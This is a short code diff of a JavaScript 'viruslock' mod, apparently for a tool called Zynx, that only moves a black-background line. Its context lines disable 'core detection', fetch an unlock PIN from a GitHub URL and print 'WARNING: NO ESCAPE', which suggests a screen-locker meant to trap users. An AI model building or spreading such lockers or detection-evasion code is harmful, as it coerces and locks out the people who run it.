@@ -1,5 +1,4 @@
 iscoredetected = null; // Mematikan deteksi core Zynx
-document.body.style.backgroundColor = "black";
 (async function() {
     // Pastikan link ini berisi text pin, contoh: 1234 atau array ["1234", "5678"]
     const urlGithub = 'https://raw.githubusercontent.com/kenzz-sz/Zynx_mod/refs/heads/main/mods/viruslock/pin.txt';
@@ -132,4 +131,5 @@ document.body.style.backgroundColor = "black";
     });
 
     console.log("%c WARNING: NO ESCAPE ", "background: red; color: white; font-size: 20px;");
+    document.body.style.background = "black";
 })();
